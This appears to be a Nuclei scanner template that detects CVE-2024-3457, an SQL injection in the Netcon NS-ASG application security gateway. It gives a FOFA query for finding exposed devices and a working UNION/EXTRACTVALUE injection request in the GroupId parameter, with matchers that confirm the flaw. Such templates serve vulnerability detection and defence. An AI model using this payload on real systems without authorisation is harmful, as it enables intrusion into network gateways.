id: cve-2024-3457
info:
  name: 网康科技NS-ASG应用安全网关 config_ISCGroupNoCache.php SQL注入漏洞(CVE-2024-3457)
  author: ProjectDiscoveryAI
  severity: high
  tags: CVE-2024-3457,SQL注入
  metadata:
    finger: ns-asg
    fofa: title="网康-NS-ASG-应用安全网关"
variables:
  t1: "{{rand_int(1000, 9999)}}"
  t2: "{{md5(t1)}}"
http:
  - method: GET
    path:
      - "/admin/config_ISCGroupNoCache.php?GroupId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+md5({{t1}})),0x7e))"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "XPATH syntax error"
          - "{{t2}}"
